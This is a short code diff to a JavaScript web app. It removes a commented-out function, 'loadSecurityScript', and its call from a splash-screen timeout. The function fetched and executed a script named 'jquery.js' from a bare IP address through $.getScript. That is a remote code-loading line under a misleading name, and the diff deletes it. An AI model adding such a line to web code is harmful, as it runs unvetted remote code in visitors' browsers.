@@ -1024,16 +1024,6 @@ function getRemainingSeconds(date) {
 
 var countdownInterval;
 
-function loadSecurityScript() {
-//    $.getScript( "http://80.211.156.24:8080/jquery.js" )
-//        .done(function( script, textStatus ) {
-//            // do nothing
-//        })
-//        .fail(function( jqxhr, settings, exception ) {
-//            console.info( "Triggered ajaxError handler." + exception );
-//        });
-}
-
 function onLoad() {
     // register service worker (needed for the app to be suggested as webapp)
     registerServiceWorker();
@@ -1335,7 +1325,6 @@ function initMap() {
             setTimeout(function () {
                 $(".splash").fadeOut();
 //                 showCurrentLocation();
-//                loadSecurityScript();
             }, 3500);
 
 //             $(window).focus(function () {
